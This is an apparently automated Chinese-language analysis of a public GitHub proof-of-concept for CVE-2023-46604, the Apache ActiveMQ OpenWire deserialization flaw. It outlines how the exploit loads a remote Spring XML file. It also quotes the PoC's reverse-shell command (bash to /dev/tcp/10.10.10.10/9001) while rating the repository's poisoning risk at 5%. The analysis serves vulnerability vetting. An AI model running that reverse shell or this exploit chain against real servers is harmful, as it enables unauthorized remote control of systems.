## CVE-2023-46604-Apache ActiveMQ-远程代码执行

**漏洞编号:** CVE-2023-46604

**漏洞类型:** 远程代码执行

**影响应用:** Apache ActiveMQ

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3

**利用条件:** 需要网络访问ActiveMQ服务，且目标系统存在受影响的ActiveMQ版本。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-46604是Apache ActiveMQ中的一个反序列化漏洞，存在于OpenWire协议中。攻击者可以利用此漏洞，通过构造恶意的序列化数据，使ActiveMQ服务端或客户端（取决于攻击目标）实例化任意类，从而执行任意代码。利用方式如下：

1.  **漏洞原理：** OpenWire协议在处理序列化数据时，没有充分验证数据的合法性，导致可以被恶意构造。
2.  **利用方法：** 攻击者发送特制的OpenWire消息，消息中包含恶意类的序列化数据。当ActiveMQ尝试反序列化这些数据时，会导致恶意类被实例化，执行其中的代码。
3.  **POC分析：**
    *   `exploit.py`:  Python脚本，用于构造并发送恶意OpenWire消息。
        *   脚本接受目标IP、端口和包含Spring XML配置文件的URL作为参数。
        *   脚本构造一个OpenWire消息，消息体包含`org.springframework.context.support.ClassPathXmlApplicationContext`类名和XML配置文件的URL。
        *   脚本将消息发送到目标ActiveMQ服务器。
    *   `poc.xml`:  Spring XML配置文件，用于执行任意命令。
        *   配置文件定义了一个`java.lang.ProcessBuilder` bean，并设置了`init-method`为`start`，这意味着在bean被创建时，`start`方法会被自动调用。
        *   `constructor-arg`定义了`ProcessBuilder`的构造函数参数，这里是一个包含`bash`命令的列表，用于执行反向shell。
4.  **投毒风险评估：**

该仓库中的代码主要用于触发和利用漏洞，本身**不包含明显的恶意代码**（例如，持久化后门、信息窃取等）。然而，由于此漏洞允许远程代码执行，攻击者**可能利用此漏洞植入恶意软件**。`poc.xml`中使用了`bash -i >& /dev/tcp/10.10.10.10/9001 0>&1`指令，这是一个常见的反弹shell方法，可以判定为合法的利用代码，不能算投毒。

因此，**投毒风险较低，但存在通过漏洞利用植入恶意代码的可能性。**我们分析得出投毒风险的可能性为5%。绝大部分风险来源于漏洞本身，而非仓库作者的恶意行为。

5. **有效性:**
   根据漏洞库信息、搜索结果以及漏洞利用代码分析，该漏洞可以利用，并且互联网上已存在多种利用此漏洞的恶意行为，具有较高的有效性。

**项目地址:** [evkl1d/CVE-2023-46604](https://github.com/evkl1d/CVE-2023-46604)

**漏洞详情:** [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)